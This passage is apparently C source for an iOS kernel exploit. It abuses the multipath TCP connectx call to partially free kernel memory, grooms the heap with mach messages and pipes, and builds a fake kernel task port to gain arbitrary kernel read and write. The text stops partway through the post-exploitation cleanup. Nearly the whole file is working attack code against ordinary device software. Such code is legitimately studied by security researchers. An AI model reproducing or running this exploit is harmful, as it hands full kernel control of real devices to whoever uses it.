#define USE_VFS 1

#if !USE_VFS

#include <sys/resource.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/uio.h>

#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <fcntl.h>

#include <pthread.h>
#include <mach/mach.h>

#include "offsets.h"
#include "kmem.h"

extern uint32_t message_size_for_kalloc_size(size_t kalloc_size);

kern_return_t mach_vm_read(
                           vm_map_t target_task,
                           mach_vm_address_t address,
                           mach_vm_size_t size,
                           vm_offset_t *data,
                           mach_msg_type_number_t *dataCnt);

kern_return_t mach_vm_write(
                            vm_map_t target_task,
                            mach_vm_address_t address,
                            vm_offset_t data,
                            mach_msg_type_number_t dataCnt);

kern_return_t mach_vm_read_overwrite(
                                     vm_map_t target_task,
                                     mach_vm_address_t address,
                                     mach_vm_size_t size,
                                     mach_vm_address_t data,
                                     mach_vm_size_t *outsize);

void increase_limits() {
  struct rlimit lim = {0};
  int err = getrlimit(RLIMIT_NOFILE, &lim);
  if (err != 0) {
    printf("failed to get limits\n");
  }
  printf("rlim.cur: %lld\n", lim.rlim_cur);
  printf("rlim.max: %lld\n", lim.rlim_max);
  
  lim.rlim_cur = 10240;
  
  err = setrlimit(RLIMIT_NOFILE, &lim);
  if (err != 0) {
    printf("failed to set limits\n");
  }
  
  lim.rlim_cur = 0;
  lim.rlim_max = 0;
  err = getrlimit(RLIMIT_NOFILE, &lim);
  if (err != 0) {
    printf("failed to get limits\n");
  }
  printf("rlim.cur: %lld\n", lim.rlim_cur);
  printf("rlim.max: %lld\n", lim.rlim_max);
  
}

#define AF_MULTIPATH 39
int alloc_mptcp_socket() {
  int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
  if (sock < 0) {
    printf("socket failed\n");
    perror("");
    return -1;
  }
  return sock;
}


void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes) {
  struct sockaddr* sockaddr_src = malloc(256);
  memset(sockaddr_src, 'D', 256);
  *(uint64_t*) (((uint8_t*)sockaddr_src)+koffset(KFREE_ADDR_OFFSET)) = kaddr;
  sockaddr_src->sa_len = koffset(KFREE_ADDR_OFFSET)+n_bytes;
  sockaddr_src->sa_family = 'B';
  
  struct sockaddr* sockaddr_dst = malloc(256);
  memset(sockaddr_dst, 'C', 256);
  sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
  sockaddr_dst->sa_family = AF_INET6;
  
  sa_endpoints_t eps = {0};
  eps.sae_srcif = 0;
  eps.sae_srcaddr = sockaddr_src;
  eps.sae_srcaddrlen = koffset(KFREE_ADDR_OFFSET)+n_bytes;
  eps.sae_dstaddr = sockaddr_dst;
  eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
  
  printf("doing partial overwrite with target value: %016llx, length %d\n", kaddr, n_bytes);
  
  int err = connectx(
                     fd,
                     &eps,
                     SAE_ASSOCID_ANY,
                     0,
                     NULL,
                     0,
                     NULL,
                     NULL);
  
  printf("err: %d\n", err);
  
  close(fd);
  
  
  return;
}

char* aaaas = NULL;

int read_fds[10000] = {0};
int write_fds[10000] = {0};
int next_read_fd = 0;

#define PIPE_SIZE 0x7ff

int alloc_and_fill_pipe() {
  int fds[2] = {0};
  int err = pipe(fds);
  if (err != 0) {
    perror("pipe failed\n");
    return -1;
  }
  
  int read_end = fds[0];
  int write_end = fds[1];
  
  int flags = fcntl(write_end, F_GETFL);
  flags |= O_NONBLOCK;
  fcntl(write_end, F_SETFL, flags);
  
  if (aaaas == NULL) {
    aaaas = malloc(PIPE_SIZE);
    memset(aaaas, 'B', PIPE_SIZE);
  }
  
  ssize_t amount_written = write(write_end, aaaas, PIPE_SIZE);
  if (amount_written != PIPE_SIZE) {
    printf("amount written was short: 0x%ld\n", amount_written);
  }
  read_fds[next_read_fd++] = read_end;
  //printf("filled pipe %d\n", read_end);
  return read_end; // the buffer is actually hanging off the read end struct pipe
}

int find_replacer_pipe(void** contents) {
  uint64_t* read_back = malloc(PIPE_SIZE);
  for (int i = 0; i < next_read_fd; i++) {
    int fd = read_fds[i];
    ssize_t amount = read(fd, read_back, PIPE_SIZE);
    if (amount != PIPE_SIZE) {
      printf("short read (%ld)\n", amount);
    } else {
      printf("full read\n");
    }
    
    int pipe_is_replacer = 0;
    for (int j = 0; j < PIPE_SIZE/8; j++) {
      if (read_back[j] != 0x4242424242424242) {
        pipe_is_replacer = 1;
        printf("found an unexpected value: %016llx\n", read_back[j]);
      }
    }
    
    if (pipe_is_replacer) {
      *contents = read_back;
      return fd;
    }
  }
  return -1;
}


mach_port_t fake_kalloc(int size) {
  mach_port_t port = MACH_PORT_NULL;
  kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  if (err != KERN_SUCCESS) {
    printf("unable to allocate port\n");
  }
  struct simple_msg  {
    mach_msg_header_t hdr;
    char buf[0];
  };
  
  mach_msg_size_t msg_size = message_size_for_kalloc_size(size);
  struct simple_msg* msg = malloc(msg_size);
  memset(msg, 0, sizeof(struct simple_msg));
  memset(msg+1, 'E', msg_size - sizeof(struct simple_msg));
  
  msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
  msg->hdr.msgh_size = msg_size;
  msg->hdr.msgh_remote_port = port;
  msg->hdr.msgh_local_port = MACH_PORT_NULL;
  msg->hdr.msgh_id = 0x41414142;
  
  err = mach_msg(&msg->hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 msg_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  
  if (err != KERN_SUCCESS) {
    printf("early kalloc failed to send message\n");
  }
  
  return port;
}

void fake_kfree(mach_port_t port) {
  mach_port_destroy(mach_task_self(), port);
}

#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_NONE 0

void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, uint64_t initial_read_addr, uint64_t vm_map, uint64_t receiver) {
  // clear the region we'll use:
  memset(fake_port, 0, 0x500);
  
  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;
  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references
  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = 0x123456789abcdef;
  
  
  uint64_t fake_task_kaddr = fake_port_kaddr + 0x100;
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_kaddr;
  
  uint8_t* fake_task = fake_port + 0x100;
  
  // set the ref_count field of the fake task:
  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
  
  // make sure the task is active
  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
  
  // set the vm_map of the fake task:
  *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
  
  // set the task lock type of the fake task's lock:
  *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
  
  // set the bsd_info pointer to be 0x10 bytes before the desired initial read:
  *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - 0x10;
}

/*
 * Things are easier and more stable if we can get the reallocated message buffer to be a pre-alloced one
 * as it won't be freed when we receive the message. This gives us one fewer places where we need to control
 * the reallocation of an object (a source of unreliability.)
 *
 * Ideally we'd like to use this ipc kmsg to also give us a useful kernel pointer to help us build the arbitrary
 * r/w. If we can get a send right to the host port in the kmsg we can use that as a building block to find the
 * kernel task port from which we can copy all the stuff we need to build a "fake" kernel task port.
 *
 * There aren't that many places where we can get the kernel to send a message containing a port we control.
 * One option is to use exception messages; we can actually get the kernel to use arbitrary ports as the task and thread ports.
 */

// size is desired kalloc size for message
mach_port_t prealloc_port(natural_t size) {
  kern_return_t err;
  mach_port_qos_t qos = {0};
  qos.prealloc = 1;
  qos.len = message_size_for_kalloc_size(size);
  
  mach_port_name_t name = MACH_PORT_NULL;
  
  err = mach_port_allocate_full(mach_task_self(),
                                MACH_PORT_RIGHT_RECEIVE,
                                MACH_PORT_NULL,
                                &qos,
                                &name);
  
  if (err != KERN_SUCCESS) {
    printf("pre-allocated port allocation failed: %s\n", mach_error_string(err));
    return MACH_PORT_NULL;
  }
  
  return (mach_port_t)name;
}

mach_port_t extracted_thread_port = MACH_PORT_NULL;

kern_return_t catch_exception_raise_state_identity
(
 mach_port_t exception_port,
 mach_port_t thread,
 mach_port_t task,
 exception_type_t exception,
 exception_data_t code,
 mach_msg_type_number_t codeCnt,
 int *flavor,
 thread_state_t old_state,
 mach_msg_type_number_t old_stateCnt,
 thread_state_t new_state,
 mach_msg_type_number_t *new_stateCnt
 )
{
  printf("catch_exception_raise_state_identity\n");
  
  // the thread port isn't actually the thread port
  // we rewrote it via the pipe to be the fake kernel r/w port
  printf("thread: %x\n", thread);
  extracted_thread_port = thread;
  
  mach_port_deallocate(mach_task_self(), task);
  
  // make the thread exit cleanly when it resumes:
  memcpy(new_state, old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
  _STRUCT_ARM_THREAD_STATE64* new = (_STRUCT_ARM_THREAD_STATE64*)(new_state);
  
  *new_stateCnt = old_stateCnt;
  
  new->__pc = (uint64_t)pthread_exit;
  new->__x[0] = 0;
  
  // let the thread resume and exit
  return KERN_SUCCESS;
}

union max_msg {
  union __RequestUnion__exc_subsystem requests;
  union __ReplyUnion__exc_subsystem replies;
};

extern boolean_t exc_server(mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP);

void* do_thread(void* arg) {
  mach_port_t exception_port = (mach_port_t)arg;
  
  kern_return_t err;
  err = thread_set_exception_ports(
                                   mach_thread_self(),
                                   EXC_MASK_ALL,
                                   exception_port,
                                   EXCEPTION_STATE_IDENTITY, // catch_exception_raise_state_identity messages
                                   ARM_THREAD_STATE64);
  
  if (err != KERN_SUCCESS) {
    printf("failed to set exception port\n");
  }
  
  // make the thread port which gets sent in the message actually be the host port
  err = thread_set_special_port(mach_thread_self(), THREAD_KERNEL_PORT, mach_host_self());
  if (err != KERN_SUCCESS) {
    printf("failed to set THREAD_KERNEL_PORT\n");
  }
  
  // cause an exception message to be sent by the kernel
  volatile char* bAAAAd_ptr = (volatile char*)0x41414141;
  *bAAAAd_ptr = 'A';
  printf("no crashy?");
  return NULL;
}

void prepare_prealloc_port(mach_port_t port) {
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
}

int port_has_message(mach_port_t port) {
  kern_return_t err;
  mach_port_seqno_t msg_seqno = 0;
  mach_msg_size_t msg_size = 0;
  mach_msg_id_t msg_id = 0;
  mach_msg_trailer_t msg_trailer; // NULL trailer
  mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
  err = mach_port_peek(mach_task_self(),
                       port,
                       MACH_RCV_TRAILER_NULL,
                       &msg_seqno,
                       &msg_size,
                       &msg_id,
                       (mach_msg_trailer_info_t)&msg_trailer,
                       &msg_trailer_size);
  
  return (err == KERN_SUCCESS);
}

// we need a send right for port
void send_prealloc_msg(mach_port_t port) {
  // start a new thread passing it the buffer and the exception port
  pthread_t t;
  pthread_create(&t, NULL, do_thread, (void*)port);
  
  // associate the pthread_t with the port so that we can join the correct pthread
  // when we receive the exception message and it exits:
  kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
  if (err != KERN_SUCCESS) {
    printf("failed to set context\n");
  }
  printf("set context\n");
  // wait until the message has actually been sent:
  while(!port_has_message(port)){;}
  printf("message was sent\n");
}

// receive the exception message on the port and extract the thread port
// which we will have overwritten with a pointer to the initial kernel r/w port
mach_port_t receive_prealloc_msg(mach_port_t port) {
  kern_return_t err = mach_msg_server_once(exc_server,
                                           sizeof(union max_msg),
                                           port,
                                           MACH_MSG_TIMEOUT_NONE);
  
  printf("receive_prealloc_msg: %s\n", mach_error_string(err));
  
  // get the pthread context back from the port and join it:
  pthread_t t;
  err = mach_port_get_context(mach_task_self(), port, (mach_port_context_t*)&t);
  pthread_join(t, NULL);
  
  return extracted_thread_port;
}

uint64_t early_read_pipe_buffer_kaddr;
int early_read_pipe_read_end;
int early_read_pipe_write_end;
mach_port_t early_read_port;

mach_port_t prepare_early_read_primitive(uint64_t pipe_buffer_kaddr, int pipe_read_end, int pipe_write_end, mach_port_t replacer_port, uint8_t* original_contents) {
  early_read_pipe_buffer_kaddr = pipe_buffer_kaddr;
  early_read_pipe_read_end = pipe_read_end;
  early_read_pipe_write_end = pipe_write_end;
  early_read_port = replacer_port;
  
  // we have free space in the ipc_kmsg from +58h to +648
  
  // lets build an initial kernel read port in there
  // like in async_wake, extra_recipe and yalu
  uint64_t fake_port_offset = 0x100; // where in the pipe/ipc_kmsg to put it
  uint64_t fake_port_kaddr = early_read_pipe_buffer_kaddr + fake_port_offset;
  
  build_fake_task_port(original_contents+fake_port_offset, fake_port_kaddr, early_read_pipe_buffer_kaddr, 0, 0);
  
  // the thread port is at +66ch
  // we could parse the kmsg properly, but this'll do...
  // replace the thread port pointer with one to our fake port:
  *((uint64_t*)(original_contents+0x66c)) = fake_port_kaddr;
  
  // replace the ipc_kmsg:
  write(pipe_write_end, original_contents, PIPE_SIZE);
  
  early_read_port = receive_prealloc_msg(replacer_port);
  
  return early_read_port;
}

uint32_t early_rk32(uint64_t kaddr) {
  uint8_t* pipe_contents = malloc(PIPE_SIZE);
  ssize_t amount = read(early_read_pipe_read_end, pipe_contents, PIPE_SIZE);
  if (amount != PIPE_SIZE) {
    printf("early_rk32 pipe buffer read was short\n");
  }
  
  // no need to actually build it again, but this read function will only be used a handful of times during bootstrap
  
  uint64_t fake_port_offset = 0x100; // where in the pipe/ipc_kmsg to put it
  uint64_t fake_port_kaddr = early_read_pipe_buffer_kaddr + fake_port_offset;
  
  build_fake_task_port(pipe_contents+fake_port_offset, fake_port_kaddr, kaddr, 0, 0);
  
  // replace the ipc_kmsg:
  write(early_read_pipe_write_end, pipe_contents, PIPE_SIZE);
  
  uint32_t val = 0;
  kern_return_t err = pid_for_task(early_read_port, (int*)&val);
  if (err != KERN_SUCCESS) {
    printf("pid_for_task returned %x\n", err);
  }
  printf("read val via pid_for_task: %08x\n", val);
  free(pipe_contents);
  return val;
}

uint64_t early_rk64(uint64_t kaddr) {
  uint64_t lower = (uint64_t)early_rk32(kaddr);
  uint64_t upper = (uint64_t)early_rk32(kaddr + 4);
  uint64_t final = lower | (upper << 32);
  return final;
}

// yes, this isn't the real kernel task port
// but you can modify the exploit easily to give you that if you want it!
mach_port_t prepare_tfp0(uint64_t vm_map, uint64_t receiver) {
  uint8_t* pipe_contents = malloc(PIPE_SIZE);
  ssize_t amount = read(early_read_pipe_read_end, pipe_contents, PIPE_SIZE);
  if (amount != PIPE_SIZE) {
    printf("prepare_tfp0 pipe buffer read was short\n");
  }
  
  uint64_t fake_port_offset = 0x100; // where in the pipe/ipc_kmsg to put it
  uint64_t fake_port_kaddr = early_read_pipe_buffer_kaddr + fake_port_offset;
  
  build_fake_task_port(pipe_contents+fake_port_offset, fake_port_kaddr, 0x4848484848484848, vm_map, receiver);
  
  // replace the ipc_kmsg:
  write(early_read_pipe_write_end, pipe_contents, PIPE_SIZE);
  
  free(pipe_contents);
  
  // early_read_port is no longer only capable of reads!
  return early_read_port;
}

mach_port_t tfp0 = MACH_PORT_NULL;
void prepare_for_rw_with_fake_tfp0(mach_port_t new_tfp0) {
  tfp0 = new_tfp0;
}

void wk32(uint64_t kaddr, uint32_t val) {
  if (tfp0 == MACH_PORT_NULL) {
    printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
    sleep(3);
    return;
  }
  
  kern_return_t err;
  err = mach_vm_write(tfp0,
                      (mach_vm_address_t)kaddr,
                      (vm_offset_t)&val,
                      (mach_msg_type_number_t)sizeof(uint32_t));
  
  if (err != KERN_SUCCESS) {
    printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
    return;
  }
}

void wk64(uint64_t kaddr, uint64_t val) {
  uint32_t lower = (uint32_t)(val & 0xffffffff);
  uint32_t higher = (uint32_t)(val >> 32);
  wk32(kaddr, lower);
  wk32(kaddr+4, higher);
}

uint32_t rk32(uint64_t kaddr) {
  kern_return_t err;
  uint32_t val = 0;
  mach_vm_size_t outsize = 0;
  err = mach_vm_read_overwrite(tfp0,
                               (mach_vm_address_t)kaddr,
                               (mach_vm_size_t)sizeof(uint32_t),
                               (mach_vm_address_t)&val,
                               &outsize);
  if (err != KERN_SUCCESS){
    printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
    sleep(3);
    return 0;
  }
  
  if (outsize != sizeof(uint32_t)){
    printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
    sleep(3);
    return 0;
  }
  return val;
}

uint64_t rk64(uint64_t kaddr) {
  uint64_t lower = rk32(kaddr);
  uint64_t higher = rk32(kaddr+4);
  uint64_t full = ((higher<<32) | lower);
  return full;
}

mach_port_t exploit() {
    offsets_init();
    
    // increase the limit on the number of open files:
    increase_limits();
    
    int target_socks[2] = {0};
    int next_sock = 0;
    
    int sockets[10000];
    int next_all_sock = 0;
    // alloc a bunch of sockets
    printf("allocating early sockets\n");
    for (int i = 0; i < 1000; i++) {
        int sock = alloc_mptcp_socket();
        sockets[next_all_sock++] = sock;
    }
    
    // a few times do:
    // alloc 16MB of messages
    // alloc a hundred sockets
    printf("trying to force a 16MB aligned 0x800 kalloc on to freelist\n");
    for (int i = 0; i < 7; i++) {
        printf("%d/6...\n", i);
        for (int j = 0; j < 0x2000; j++) {
            mach_port_t p = fake_kalloc(0x800);
        }
        for (int j = 0; j < 100; j++) {
            int sock = alloc_mptcp_socket();
            
            // we'll keep two of them:
            if (i == 6 && (j==94 || j==95)) {
                target_socks[next_sock] = sock;
                next_sock++;
                next_sock %= (sizeof(target_socks)/sizeof(target_socks[0]));
            } else {
                sockets[next_all_sock++] = sock;
            }
        }
    }
    
    printf("%d %d\n", target_socks[0], target_socks[1]);
    
    // the free is deferred by a "gc".
    // to improve the probability we are the one who gets to reuse the free'd alloc
    // lets free two things such that they both hopefully end up on the all_free list
    // and lets put a bunch of stuff on the intermediate list.
    // Intermediate is traversed before all_free so even if another thread
    // starts allocating before we do we're more likely to get the correct alloc
    mach_port_t late_ports[40];
    for (int i = 0; i < 40; i++) {
        late_ports[i] = fake_kalloc(0x800);
    }
    
    // try to put some on intermediate
    for (int i = 0; i < 10; i++) {
        fake_kfree(late_ports[i*2]);
        late_ports[i*2] = MACH_PORT_NULL;
    }
    
    // free all the other mptcp sockets:
    for (int i = 0; i < next_all_sock; i++) {
        close(sockets[i]);
    }
    
    printf("waiting for early mptcp gc...\n");
    // wait for the mptcp gc...
    for (int i = 0; i < 400; i++) {
        usleep(10000);
    }
    
    printf("trying first free\n");
    do_partial_kfree_with_socket(target_socks[0], 0, 3);
    
    printf("waiting for mptcp gc...\n");
    // wait for the mptcp gc...
    for (int i = 0; i < 400; i++) {
        usleep(10000);
    }
    
    printf("trying to refill ****************\n");
    
    // realloc with pipes:
    for (int i = 0; i < 1000; i++) { //100
        int fd = alloc_and_fill_pipe();
        usleep(1000); // 10000
    }
    
    // put half of them on intermediate:
    for (int i = 20; i < 40; i+=2) {
        fake_kfree(late_ports[i]);
        late_ports[i] = MACH_PORT_NULL;
    }
    
    printf("hopefully we got a pipe buffer in there... now freeing one of them\n");
    printf("trying second free\n");
    do_partial_kfree_with_socket(target_socks[1], 0, 3);
    
    printf("waiting for second mptcp gc...\n");
    // wait for the mptcp gc...
    for (int i = 0; i < 400; i++) {
        usleep(10000);
    }
    
    mach_port_t exception_ports[100];
    for (int i = 0; i < 100; i++) {
        mach_port_t p = prealloc_port(0x800);
        prepare_prealloc_port(p);
        exception_ports[i] = p;
        usleep(10000);
    }
    
    printf("checking....\n");
    
    uint8_t* msg_contents = NULL;
    int replacer_pipe = find_replacer_pipe(&msg_contents);
    if (replacer_pipe == -1) {
        printf("failed to get a pipe buffer over a port\n");
        return MACH_PORT_NULL;
    }
    
    // does the pipe buffer contain the mach message we sent to ourselves?
    if (msg_contents == NULL) {
        printf("didn't get any message contents\n");
        return MACH_PORT_NULL;
    }
    
    printf("this should be the empty prealloc message\n");
    
    for (int i = 0; i < 0x800/8; i++) {
        printf("+%08x %016llx\n", i*8, ((uint64_t*)msg_contents)[i]);
    }
    
    // write the empty prealloc message back over the pipe:
    write(replacer_pipe+1, msg_contents, PIPE_SIZE);
    
    // we still don't know which of our exception ports has the correct prealloced message buffer,
    // so try sending to each in turn until we hit the right one:
    uint8_t* original_contents = msg_contents;
    
    uint8_t* new_contents = malloc(PIPE_SIZE);
    memset(new_contents, 0, PIPE_SIZE);
    
    mach_port_t replacer_port = MACH_PORT_NULL;
    
    for (int i = 0; i < 100; i++) {
        send_prealloc_msg(exception_ports[i]);
        // read from the pipe and see if the contents changed:
        ssize_t amount = read(replacer_pipe, new_contents, PIPE_SIZE);
        if (amount != PIPE_SIZE) {
            printf("short read (%ld)\n", amount);
        }
        if (memcmp(original_contents, new_contents, PIPE_SIZE) == 0) {
            // they are still the same, this isn't the correct port:
            mach_port_t fake_thread_port = receive_prealloc_msg(exception_ports[i]);
            printf("received prealloc message via an exception with this thread port: %x\n", fake_thread_port);
            // that should be the real host port
            mach_port_deallocate(mach_task_self(), fake_thread_port);
            write(replacer_pipe+1, new_contents, PIPE_SIZE);
        } else {
            // different! we found the right exception port which has its prealloced port overlapping
            replacer_port = exception_ports[i];
            // don't write anything back yet; we want to modify it first:
            break;
        }
    }
    
    if (replacer_port == MACH_PORT_NULL) {
        printf("failed to find replacer port\n");
        return MACH_PORT_NULL;
    }
    
    printf("found replacer port\n");
    
    
    for (int i = 0; i < 0x800/8; i++) {
        printf("+%08x %016llx\n", i*8, ((uint64_t*)new_contents)[i]);
    }
    
    uint64_t pipe_buf = *((uint64_t*)(new_contents + 0x8));
    printf("pipe buf and prealloc message are at %016llx\n", pipe_buf);
    
    // prepare_early_read_primitive will overwrite this, lets save it now for later
    uint64_t host_port_kaddr = *((uint64_t*)(new_contents + 0x66c));
    
    // we can also find our task port kaddr:
    uint64_t task_port_kaddr = *((uint64_t*)(new_contents + 0x67c));
    
    mach_port_t kport = prepare_early_read_primitive(pipe_buf, replacer_pipe, replacer_pipe+1, replacer_port, new_contents);
    
    uint32_t val = early_rk32(pipe_buf);
    printf("%08x\n", val);
    
    // for the full read/write primitive we need to find the kernel vm_map and the kernel ipc_space
    // we can get the ipc_space easily from the host port (receiver field):
    uint64_t ipc_space_kernel = early_rk64(host_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    
    printf("ipc_space_kernel: %016llx\n", ipc_space_kernel);
    
    // the kernel vm_map is a little trickier to find
    // we can use the trick from mach_portal to find the kernel task port because we know it's gonna be near the host_port on the heap:
    
    // find the start of the zone block containing the host and kernel task pointers:
    
    uint64_t offset = host_port_kaddr & 0xfff;
    uint64_t first_port = 0;
    if ((offset % 0xa8) == 0) {
        printf("host port is on first page\n");
        first_port = host_port_kaddr & ~(0xfff);
    } else if(((offset+0x1000) % 0xa8) == 0) {
        printf("host port is on second page\n");
        first_port = (host_port_kaddr-0x1000) & ~(0xfff);
    } else if(((offset+0x2000) % 0xa8) == 0) {
        printf("host port is on third page\n");
        first_port = (host_port_kaddr-0x2000) & ~(0xfff);
    } else if(((offset+0x3000) % 0xa8) == 0) {
        printf("host port is on fourth page\n");
        first_port = (host_port_kaddr-0x3000) & ~(0xfff);
    } else {
        printf("hummm, my assumptions about port allocations are wrong...\n");
    }
    
    printf("first port is at %016llx\n", first_port);
    uint64_t kernel_vm_map = 0;
    // now look through up to 0x4000 of ports and find one which looks like a task port:
    for (int i = 0; i < (0x4000/0xa8); i++) {
        uint64_t early_port_kaddr = first_port + (i*0xa8);
        uint32_t io_bits = early_rk32(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
        
        if (io_bits != (IO_BITS_ACTIVE | IKOT_TASK)) {
            continue;
        }
        
        // get that port's kobject:
        uint64_t task_t = early_rk64(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        if (task_t == 0) {
            printf("weird heap object with NULL kobject\n");
            continue;
        }
        
        // check the pid via the bsd_info:
        uint64_t bsd_info = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        if (bsd_info == 0) {
            printf("task doesn't have a bsd info\n");
            continue;
        }
        uint32_t pid = early_rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        if (pid != 0) {
            printf("task isn't the kernel task\n");
        }
        
        // found the right task, get the vm_map
        kernel_vm_map = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
        break;
    }
    
    if (kernel_vm_map == 0) {
        printf("unable to find the kernel task map\n");
        return MACH_PORT_NULL;
    }
    
    printf("kernel map:%016llx\n", kernel_vm_map);
    
    // now we have everything to build a fake kernel task port for memory r/w:
    mach_port_t new_tfp0 = prepare_tfp0(kernel_vm_map, ipc_space_kernel);
    printf("tfp0: %x\n", new_tfp0);
    
    // test it!
    vm_offset_t data_out = 0;
    mach_msg_type_number_t out_size = 0;
    kern_return_t err = mach_vm_read(new_tfp0, kernel_vm_map, 0x40, &data_out, &out_size);
    if (err != KERN_SUCCESS) {
        printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
        sleep(3);
        exit(EXIT_FAILURE);
    }
    
    printf("kernel read via second tfp0 port worked?\n");
    printf("0x%016llx\n", *(uint64_t*)data_out);
    printf("0x%016llx\n", *(uint64_t*)(data_out+8));
    printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
    printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
    
    // now bootstrap the proper r/w methods:
    prepare_for_rw_with_fake_tfp0(new_tfp0);
    
    // time to clean up
    // if we want to exit cleanly and keep the fake tfp0 alive we need to remove all reference to the memory it uses.
    // it's reference three times:
    // 1) the early_kalloc mach_message which was used to get the 16MB aligned allocation on to the free list in the first place
    // 2) the replacer_pipe buffer
    // 3) the replacer_port prealloced message
    
    // we also want to do this without using any kernel text offsets (only structure offsets)
    // as a starting point we want the task port; we actually do know where this is because the exception messages contained it
    
    // for 1 & 3 we need to look through the task's mach port table
    uint64_t task_kaddr = rk64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t is_table_size = rk32(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));
    
    const int sizeof_ipc_entry_t = 0x18;
    for (uint32_t i = 0; i < is_table_size; i++) {
        uint64_t port_kaddr = rk64(is_table + (i * sizeof_ipc_entry_t));
        
        if (port_kaddr == 0) {
            continue;
        }
        
        // check the ikmq_base field
        uint64_t kmsg = rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
        if (kmsg == pipe_buf) {
            // neuter it:
            printf("clearing kmsg from port %016llx\n", port_kaddr);
            wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);
            wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000);
        }
        
        // check for a prealloced msg:
        uint32_t ip_bits = rk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
#define  IP_BIT_PREALLOC    0x00008000
        if (ip_bits & IP_BIT_PREALLOC) {
            uint64_t premsg = rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG));
            if (premsg == pipe_buf) {
                // clear the premsg:
                printf("clearing premsg from port %016llx\n", port_kaddr);
                wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG), 0);
                ip_bits &= (~IP_BIT_PREALLOC);
                wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), ip_bits);
            }
        }
    }
    
    printf("going to try to clear up the pipes now\n");
    
    // finally we have to fix up the pipe's buffer
    // for this we need to find the process fd table:
    // struct proc:
    uint64_t proc_addr = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
    // struct filedesc
    uint64_t filedesc = rk64(proc_addr + koffset(KSTRUCT_OFFSET_PROC_P_FD));
    
    // base of ofiles array
    uint64_t ofiles_base = rk64(filedesc + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
    
    uint64_t ofiles_offset = ofiles_base + (replacer_pipe * 8);
    
    // struct fileproc
    uint64_t fileproc = rk64(ofiles_offset);
    
    // struct fileglob
    uint64_t fileglob = rk64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    
    // struct pipe
    uint64_t pipe = rk64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    
